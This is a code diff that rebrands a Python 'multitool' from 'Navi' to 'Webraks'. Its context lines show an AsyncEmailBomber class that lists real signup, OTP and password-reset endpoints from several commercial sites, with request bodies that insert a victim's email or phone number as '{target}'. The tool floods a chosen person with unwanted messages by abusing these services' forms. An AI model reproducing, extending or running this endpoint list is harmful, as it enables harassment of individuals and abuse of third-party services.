@@ -1,12 +1,5 @@
-#  _   _                 _ 
-# | \ | |               (_)
-# |  \| | __ ___   __ _  _ 
-# | . ` |/ _` \ \ / /(_)| |
-# | |\  | (_| |\ V /  _ | |
-# |_| \_|\__,_| \_/  (_)|_|
-# 
-# Navi Multitool - Developed by glockinhand
-# GitHub: https://github.com/glockinhand/webraks-multitool
+# Webraks Multitool - Developed by w3br4ks
+# GitHub: https://github.com/w3br4ks/webraks-multitool
 
 import asyncio
 import aiohttp
@@ -52,7 +45,7 @@ class AsyncEmailBomber:
             ("Moglix OTP", "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "POST", "json", {"email": "{target}", "phone": "9999999999", "type": "p", "source": "signup"}),
             ("Bikroy Account", "https://bikroy.com/data/account", "POST", "json", {"account":{"profile":{"name":"{rand}","opt_out":False},"login":{"email":"{target}","password":"Password123"}}}),
             ("Bikroy Reset", "https://bikroy.com/data/password_resets", "POST", "json", {"email": "{target}"}),
-            ("Busbud Signup", "https://www.busbud.com/auth/email-signup", "POST", "json", {"first_name":"User","last_name":"Navi","email":"{target}","password":"Password123","confirmed_password":"Password123","email_opt_in":False,"locale":"en"}),
+            ("Busbud Signup", "https://www.busbud.com/auth/email-signup", "POST", "json", {"first_name":"User","last_name":"Webraks","email":"{target}","password":"Password123","confirmed_password":"Password123","email_opt_in":False,"locale":"en"}),
             ("Mithaibd Register", "https://mithaibd.com/", "POST", "data", "phone={target}"),
             ("Sara Reset", "https://prod.saralifestyle.com/api/Master/SendTokenV1", "POST", "json", {"userContactNo":"{target}","userType":"customer","actionFor":"r"}),
             ("Tohfay Register", "https://www.tohfay.com/user/register.html", "POST", "data", "phone={target}"),
